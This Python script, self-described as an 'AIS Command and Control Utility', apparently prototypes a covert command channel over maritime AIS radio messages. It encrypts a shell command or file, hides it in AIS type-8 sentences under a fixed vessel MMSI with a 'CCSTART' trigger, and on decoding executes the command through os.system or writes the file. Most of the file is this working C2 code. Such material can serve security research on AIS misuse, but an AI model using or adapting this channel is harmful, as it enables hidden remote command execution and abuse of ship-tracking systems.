from pickle import GLOBAL
from pyais.encode import encode_dict
from rsa import decrypt
from NMEA import NMEA
import os
from Crypto.Cipher import AES
import binascii as b
import argparse

KEY = b"sixteen byte key"
OPTION = None
FILE_NAME = None

def file_open(filename):
    file_data = open(filename,"rb").read()
    return file_data    

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_EAX, nonce = KEY)    
    ciphertext = bytes(cipher.encrypt(data).hex(), encoding='utf-8')
    return ciphertext

def construct_payload(ciphertext):
    payload_len = len(ciphertext)
    payload = list()
    attack_data = {
            'mmsi': '366053209',
            'type': 8,
            'data' : None
    }

    if len(ciphertext) > 38:
        num_of_fragments = payload_len // 38 + (1 if payload_len % 38 > 0 else 0)
        print(num_of_fragments)
        for i in range(0, payload_len, 38):
            attack_data['data'] = ciphertext[i:38+i]
            ais_payload = encode_dict(attack_data, radio_channel="B", talker_id="AIVDM")[0]
            payload.append(ais_payload)
        print(payload)
        

    else:
        attack_data['data'] = ciphertext
        ais_payload = encode_dict(attack_data, radio_channel="B", talker_id="AIVDM")[0]
        payload.append(ais_payload)
    
    if OPTION == "FILE":
        trigger = f"CCSTART:{OPTION}:{len(payload)}:{FILE_NAME}"
    elif OPTION == "CMD":
        trigger = f"CCSTART:{OPTION}:{len(payload)}"
    
    print(f"[*] Trigger Constructed: {trigger}")
    attack_data['data'] = bytes(trigger, encoding="utf-8")
    trigger_payload = encode_dict(attack_data, radio_channel="B", talker_id="AIVDM")[0]

    payload.insert(0, trigger_payload)

    return payload


def get_input():
    parser = argparse.ArgumentParser(description="AIS Command and Control Utility")
    parser.add_argument("-c", "--command", help="Command to be sent and executed")
    parser.add_argument("-f", "--file", help="Filename to be sent")
    args = parser.parse_args()
    return args

def decrypt_and_decode(payloads):
    decrypt_cipher = AES.new(KEY, AES.MODE_EAX, nonce = KEY)
    sentence_count = 0
    trigger_received = False
    received_cipher =  ""
    option = None
    filename  = None

    for payload in payloads:
        nmea_ais = NMEA(sentence = payload)
        nmea_ais.decode()
        decoded_ais = nmea_ais.data #['data'].decode()
        print(decoded_ais)

        if trigger_received and decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and sentence_count != 0:
            
            received_cipher += decoded_ais['data'].decode()
            sentence_count -= 1
        
        if trigger_received and sentence_count == 0:
            received_cipher = bytes.fromhex(received_cipher)
            plaintext = decrypt_cipher.decrypt(received_cipher)
            print(plaintext)
            if option == "CMD":
                os.system(plaintext.decode())
            if option == "FILE":
                out_file = open(filename,'w')
                out_file.write(plaintext.decode())
                out_file.close()
    
        if decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and not trigger_received:
            data = str(decoded_ais['data'].decode()).split(":")
            if len(data) >= 3 and data[0] == "CCSTART":
                option = data[1]
                sentence_count = int(data[2])
                trigger_received = True
                if option == "FILE":   
                    filename = data[3]

                



def main():
    global OPTION
    global FILE_NAME

    args = get_input()
    
    if args.command:
        OPTION = "CMD"
        data = bytes(args.command, encoding="utf-8")
        print(f"[*] Received {OPTION}: {data}")
    elif args.file:
        OPTION = "FILE"
        FILE_NAME = args.file
        data = file_open(FILE_NAME)
        print(f"[*] Received {OPTION}: {FILE_NAME}")
    
    # OPTION = "CMD"
    # data = b"ls"

    hidden_cc = encrypt(data)
    print(f"[*] AES Encypted payload {hidden_cc}")
    payloads = construct_payload(hidden_cc)
    print(f"[*] AIS payloads:--------------------------------------------------------------------")
    for payload in payloads:
        print(payload)

    print()
    decrypt_and_decode(payloads)


if __name__ == "__main__":
    main()

# decrypt_cipher = AES.new(key, AES.MODE_EAX, nonce = key)
# plaintext = ""
# received_cipher = ""

# for payload in payload_chunks:
#     obj = NMEA(sentence = payload)
#     obj.decode()
#     received_cipher += obj.data['data'].decode()

# print(received_cipher)

# received_cipher = bytes.fromhex(received_cipher)

# plaintext = decrypt_cipher.decrypt(received_cipher)
# print(plaintext)
# out = open('out.py','w')
# out.write(plaintext.decode())
# print(plaintext)
# #os.system(obj.data['data'].decode())
